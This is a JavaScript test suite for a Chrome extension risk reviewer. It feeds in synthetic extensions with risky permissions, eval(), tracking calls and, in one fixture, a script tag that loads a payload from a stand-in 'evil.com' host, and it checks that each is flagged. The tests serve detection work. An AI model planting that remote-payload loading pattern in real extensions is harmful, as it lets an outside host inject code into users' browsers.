import { describe, it, expect } from 'vitest';
import { CRXReviewer } from '../src/crx-reviewer.js';
import JSZip from 'jszip';

/**
 * Build a synthetic Chrome Extension ZIP buffer for testing.
 * @param {object} manifest — manifest.json content
 * @param {{name: string, code: string}[]} jsFiles — JS files to include
 * @returns {Promise<ArrayBuffer>}
 */
async function buildExtensionZip(manifest, jsFiles = []) {
  const zip = new JSZip();
  zip.file('manifest.json', JSON.stringify(manifest, null, 2));

  for (const f of jsFiles) {
    zip.file(f.name, f.code);
  }

  return zip.generateAsync({ type: 'arraybuffer' });
}

describe('CRXReviewer', () => {
  describe('Basic functionality', () => {
    it('should return error for non-zip buffer', async () => {
      const reviewer = new CRXReviewer();
      const badBuffer = new Uint8Array([0, 1, 2, 3]).buffer;
      const result = await reviewer.review(badBuffer);
      expect(result._error).toBeDefined();
    });

    it('should return error when manifest.json is missing', async () => {
      const zip = new JSZip();
      zip.file('background.js', 'console.log("test");');
      const buffer = await zip.generateAsync({ type: 'arraybuffer' });

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);
      expect(result._error).toContain('manifest.json');
    });

    it('should return error for invalid JSON in manifest', async () => {
      const zip = new JSZip();
      zip.file('manifest.json', '{bad json!!!');
      const buffer = await zip.generateAsync({ type: 'arraybuffer' });

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);
      expect(result._error).toContain('corrupted');
    });
  });

  describe('Scoring — clean extension', () => {
    it('should give high score to minimal MV3 extension', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Clean Extension',
        version: '1.0',
        permissions: ['storage'],
      };
      const buffer = await buildExtensionZip(manifest);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      expect(result.score).toBeGreaterThanOrEqual(95);
      expect(result.riskLevel.label).toBe('Low Risk');
      expect(result.stats.totalIssues).toBeLessThanOrEqual(1);
    });
  });

  describe('Scoring — risky permissions', () => {
    it('should penalize tabs permission', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Tab Reader',
        version: '1.0',
        permissions: ['tabs'],
      };
      const buffer = await buildExtensionZip(manifest);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      expect(result.score).toBeLessThan(90);
      expect(result.permissions.critical).toContain('tabs');
      const tabIssue = result.issues.find((i) => i.detail.includes('tabs'));
      expect(tabIssue).toBeDefined();
      expect(tabIssue.severity).toBe('critical');
    });

    it('should detect broad host permission <all_urls>', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'All-Seeing',
        version: '1.0',
        host_permissions: ['<all_urls>'],
      };
      const buffer = await buildExtensionZip(manifest);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      const hostIssue = result.issues.find((i) => i.category === 'host_permissions');
      expect(hostIssue).toBeDefined();
      expect(result.score).toBeLessThan(90);
    });

    it('should score multiple critical permissions very low', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Dangerous Extension',
        version: '1.0',
        host_permissions: ['<all_urls>'],
        permissions: ['tabs', 'cookies', 'webRequest', 'webRequestBlocking', 'debugger'],
      };
      const buffer = await buildExtensionZip(manifest);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      expect(result.score).toBeLessThan(30);
      expect(result.riskLevel.label).toBe('Critical Risk');
      expect(result.issues.length).toBeGreaterThanOrEqual(5);
    });
  });

  describe('Code analysis — suspicious patterns', () => {
    it('should detect eval() usage', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Eval User',
        version: '1.0',
      };
      const buffer = await buildExtensionZip(manifest, [
        { name: 'bg.js', code: 'eval("console.log(1)");' },
      ]);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      const evalIssue = result.issues.find((i) => i.detail.includes('eval()'));
      expect(evalIssue).toBeDefined();
      expect(evalIssue.severity).toBe('high');
      expect(result.score).toBeLessThan(95);
    });

    it('should detect tracking domains', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Tracker',
        version: '1.0',
      };
      const buffer = await buildExtensionZip(manifest, [
        { name: 'lib.js', code: 'fetch("https://www.google-analytics.com/collect");' },
      ]);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      const trackIssue = result.issues.find((i) => i.category === 'tracking');
      expect(trackIssue).toBeDefined();
      expect(result.stats.trackingDomainsFound).toBeGreaterThanOrEqual(1);
    });

    it('should detect remote script loading', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Remote Loader',
        version: '1.0',
      };
      const buffer = await buildExtensionZip(manifest, [
        {
          name: 'loader.js',
          code: `const s = document.createElement("script"); s.src = "https://evil.com/payload.js";`,
        },
      ]);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      const remoteIssue = result.issues.find((i) => i.category === 'remote_resources');
      expect(remoteIssue).toBeDefined();
    });
  });

  describe('Edge cases', () => {
    it('should handle large JS files without crashing', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Big Extension',
        version: '1.0',
      };
      // Generate ~100KB of harmless JS
      const largeCode = 'console.log("' + 'a'.repeat(50000) + '");\n'.repeat(2);
      const buffer = await buildExtensionZip(manifest, [
        { name: 'big.js', code: largeCode },
      ]);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      expect(result._error).toBeUndefined();
      expect(result.score).toBeGreaterThanOrEqual(90);
    });

    it('should handle extension with no JS files', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'CSS Only',
        version: '1.0',
      };
      const buffer = await buildExtensionZip(manifest);
      // Add a CSS file
      const zipForCss = await JSZip.loadAsync(buffer);
      const zip = new JSZip();

      // Rebuild with CSS
      const zip2 = new JSZip();
      zip2.file('manifest.json', JSON.stringify(manifest));
      zip2.file('style.css', 'body { color: red; }');
      const finalBuffer = await zip2.generateAsync({ type: 'arraybuffer' });

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(finalBuffer);

      expect(result._error).toBeUndefined();
      expect(result.stats.jsFilesAnalyzed).toBeGreaterThanOrEqual(0);
    });

    it('should order issues by severity (critical first)', async () => {
      const manifest = {
        manifest_version: 3,
        name: 'Mixed Issues',
        version: '1.0',
        host_permissions: ['<all_urls>'],
        permissions: ['cookies', 'storage'],
      };
      const buffer = await buildExtensionZip(manifest, [
        { name: 'bg.js', code: 'eval("x"); fetch("https://google-analytics.com/collect");' },
      ]);

      const reviewer = new CRXReviewer();
      const result = await reviewer.review(buffer);

      const sevs = result.issues.map((i) => i.severity);
      const sevOrder = { critical: 0, high: 1, medium: 2, low: 3 };
      for (let i = 1; i < sevs.length; i++) {
        expect(sevOrder[sevs[i - 1]]).toBeLessThanOrEqual(sevOrder[sevs[i]]);
      }
    });
  });
});
